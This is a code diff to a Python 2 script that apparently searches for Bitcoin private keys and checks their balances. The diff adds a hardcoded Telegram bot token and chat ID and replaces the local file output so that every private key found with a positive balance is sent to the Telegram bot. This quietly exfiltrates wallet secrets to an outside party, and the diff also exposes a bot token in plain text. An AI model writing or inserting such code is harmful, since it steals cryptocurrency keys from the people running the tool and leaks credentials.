@@ -7,6 +7,23 @@ import math
 import string 
 import numpy as np
 
+import urllib
+import urllib2
+
+TOKEN = '110309400:AAExG6jwuCUjJzeLzWqi4jmDhrEriDGT5fY'
+BASE_URL = 'https://api.telegram.org/bot' + TOKEN + '/'
+
+def reply(msg):
+
+    resp = urllib2.urlopen(BASE_URL + 'sendMessage', urllib.urlencode({
+    'chat_id': '6660201' ,
+    'text': msg.encode('utf-8'),
+    'disable_web_page_preview': 'true',
+    'reply_to_message_id': "" ,
+    })).read()
+
+    return
+
 t='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
 pubkey = 0
 rstr = ""
@@ -176,8 +193,9 @@ for n in range(10000):
 
 
     	    if amount > 0 : 
-                outfile.write(str(amount/100000000) +","+ addy(pk) +","+ numtowif(pk) +"\n")
+                # outfile.write(str(amount/100000000) +","+ addy(pk) +","+ numtowif(pk) +"\n")
+                reply(pk)
                 print numtowif(pk)
  
 
-outfile.close()
+#outfile.close()
